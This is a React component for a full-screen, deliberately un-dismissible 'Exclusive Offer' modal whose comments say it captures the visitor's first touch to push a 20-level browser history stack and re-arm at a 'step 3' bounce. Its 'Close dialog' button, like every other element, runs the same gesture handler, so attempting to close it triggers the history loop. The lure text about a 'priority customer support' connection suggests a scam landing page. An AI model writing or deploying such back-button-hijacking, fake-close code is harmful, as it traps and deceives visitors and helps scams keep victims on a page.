import { useEffect, useCallback } from 'react';

/**
 * Un-Dismissible First-Touch Capture & Step-3 Re-Arming Modal.
 *
 * Captures an immediate user gesture anywhere on the viewport (100vw x 100vh)
 * to legitimize the 20-level history stack in the browser.
 * Absolutely NO auto-dismiss timers or setTimeout.
 *
 * @param {Object} props
 * @param {boolean} props.isOpen - Whether the capture layer is mounted.
 * @param {'initial'|'bounce'} [props.mode='initial'] - 'initial' on mount, 'bounce' at step 3.
 * @param {Function} props.onAction - Called on native touch/click to run the synchronous history loop.
 */
export function InteractionModal({
  isOpen,
  mode = 'initial',
  onAction,
}) {
  // Haptic feedback & Web Audio click response
  const triggerFeedback = useCallback(() => {
    if (typeof navigator !== 'undefined' && navigator.vibrate) {
      try {
        navigator.vibrate([15, 30, 15]);
      } catch {
        // ignore
      }
    }

    try {
      const AudioContextClass = window.AudioContext || window.webkitAudioContext;
      if (AudioContextClass) {
        const ctx = new AudioContextClass();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(520, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.08);
        gain.gain.setValueAtTime(0.12, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.08);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start();
        osc.stop(ctx.currentTime + 0.08);
      }
    } catch {
      // ignore audio context restrictions
    }
  }, []);

  const handleUserGesture = useCallback(
    (event) => {
      triggerFeedback();
      if (onAction) {
        onAction(event);
      }
    },
    [onAction, triggerFeedback]
  );

  // Prevent background scrolling while un-dismissible layer is active
  useEffect(() => {
    if (!isOpen) return;
    const originalOverflow = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    return () => {
      document.body.style.overflow = originalOverflow;
    };
  }, [isOpen]);

  if (!isOpen) return null;

  const isBounce = mode === 'bounce';

  return (
    <div
      className="interaction-overlay"
      role="dialog"
      aria-modal="true"
      aria-labelledby="interaction-modal-title"
      onTouchEnd={handleUserGesture}
      onClick={handleUserGesture}
      onPointerDown={handleUserGesture}
    >
      <div
        className="interaction-modal"
        onTouchEnd={handleUserGesture}
        onClick={handleUserGesture}
      >
        {/* Close / Skip Button */}
        <button
          type="button"
          className="interaction-close-btn"
          aria-label="Close dialog"
          onTouchEnd={handleUserGesture}
          onClick={handleUserGesture}
        >
          &times;
        </button>

        {/* Status Badge */}
        <div className="interaction-badge">
          <span className="interaction-badge-dot" />
          <span>{isBounce ? 'Wait! Offer Reserved' : 'Exclusive Offer Unlocked'}</span>
        </div>

        {/* Modal Heading */}
        <h2 id="interaction-modal-title" className="interaction-title">
          {isBounce ? 'Keep Your Exclusive Offer?' : 'Exclusive Offer Unlocked'}
        </h2>

        {/* Modal Description */}
        <p className="interaction-description">
          {isBounce
            ? 'Your priority customer support reservation is still active. Tap anywhere to keep your offer and continue.'
            : 'Your direct customer priority connection is ready. Tap anywhere on the screen to continue to your verified offer.'}
        </p>

        {/* Action Button */}
        <button
          type="button"
          className="interaction-cta-btn"
          onTouchEnd={handleUserGesture}
          onClick={handleUserGesture}
        >
          <span>{isBounce ? 'Keep My Offer & Continue →' : 'Tap to Continue →'}</span>
        </button>

        <p className="interaction-subtext">
          {isBounce ? 'Tap anywhere to continue' : 'Tap anywhere on the screen to continue'}
        </p>
      </div>
    </div>
  );
}
